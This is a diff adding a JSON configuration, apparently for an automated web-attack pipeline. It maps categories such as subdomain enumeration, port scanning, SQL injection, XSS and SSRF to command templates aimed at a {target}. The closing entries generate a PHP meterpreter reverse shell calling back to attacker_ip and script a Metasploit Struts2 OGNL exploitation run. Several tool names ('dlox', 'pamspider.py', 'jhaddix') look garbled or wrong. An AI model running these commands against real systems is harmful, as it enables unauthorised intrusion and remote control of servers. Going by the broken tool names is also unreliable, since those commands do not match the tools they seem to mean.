@@ -1,0 +1,74 @@
+{
+  "Automated Subdomain Enumeration": [
+    "subfinder -d {target} -o {output}/subdomains/subfinder.txt",
+    "amass enum -passive -d {target} -o {output}/subdomains/amass.txt",
+    "assetfinder --subs-only {target} > {output}/subdomains/assetfinder.txt"
+  ],
+  "Automated Port Scanning": [
+    "masscan -p1-65535 --rate=1000 -oG {output}/ports/masscan.txt {target}",
+    "nmap -p- -sV -T4 -oN {output}/ports/nmap_results.txt {target}"
+  ],
+  "Automating Screenshot Capture": [
+    "eyewitness -f {output}/subdomains/subfinder.txt -d {output}/screenshots/",
+    "cat {output}/subdomains/subfinder.txt | aquatone -out {output}/screenshots/aquatone_output"
+  ],
+  "Automated Directory Brute Forcing": [
+    "ffuf -w wordlist.txt -u http://{target}/FUZZ",
+    "gobuster dir -u http://{target} -w wordlist.txt"
+  ],
+  "Automated JavaScript Analysis": [
+    "linkfinder -i {output}/urls.txt -o {output}/js/output.txt",
+    "gf apikey < {output}/js/javascript_files.txt > {output}/js/gf_apikey.txt"
+  ],
+  "Automated Parameter Discovery": [
+    "python3 pamspider.py -u https://{target}",
+    "arjun -u https://{target}/api -o {output}/arjun_output.txt"
+  ],
+  "Automated XSS Detection": [
+    "dlox -u https://{target}",
+    "xsstrike -u https://{target}"
+  ],
+  "Automated SQL Injection Testing": [
+    "sqlmap -u \"http://{target}/page?id=1\" --batch --dbs"
+  ],
+  "Automated SSRF Discovery": [
+    "gopherus generate-payloads",
+    "interactsh-client -v"
+  ],
+  "Automated LFI and RFI Detection": [
+    "lfi-suite -u http://{target}",
+    "fimap -u http://{target}"
+  ],
+  "Automated Open Redirect Detection": [
+    "oralizer -l {output}/urls.txt -p payloads.txt"
+  ],
+  "Automated Security Headers Check": [
+    "nikto -h http://{target}",
+    "httpx -u http://{target} -sc -title -server -o {output}/headers.txt"
+  ],
+  "Automated API Recon": [
+    "kiterunner -u https://{target}/api -w api_wordlist.txt"
+  ],
+  "Automated Content Discovery": [
+    "jhaddix -d {target} -o {output}/urls.txt",
+    "waybackurls {target} > {output}/wayback_urls.txt"
+  ],
+  "Automated S3 Bucket Enumeration": [
+    "awsbucketdump -t {target}"
+  ],
+  "Automated CMS Enumeration": [
+    "cmseek -u http://{target}"
+  ],
+  "Automated WAF Detection": [
+    "wafw00f http://{target}"
+  ],
+  "Automated Information Disclosure Detection": [
+    "gitdumper http://{target}/.git/ {output}/gitdump/"
+  ],
+  "Automated Reverse Shell Generation": [
+    "msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > {output}/shell.php"
+  ],
+  "Automated Mass Exploitation": [
+    "echo 'Use Metasploit to launch exploits such as Apache Struts 2 OGNL injection: use exploit/multi/http/struts2_ognl_injection set RHOSTS {target} set PAYLOAD php/meterpreter/reverse_tcp set LHOST attacker_ip run' > {output}/metasploit_instructions.txt"
+  ]
+}
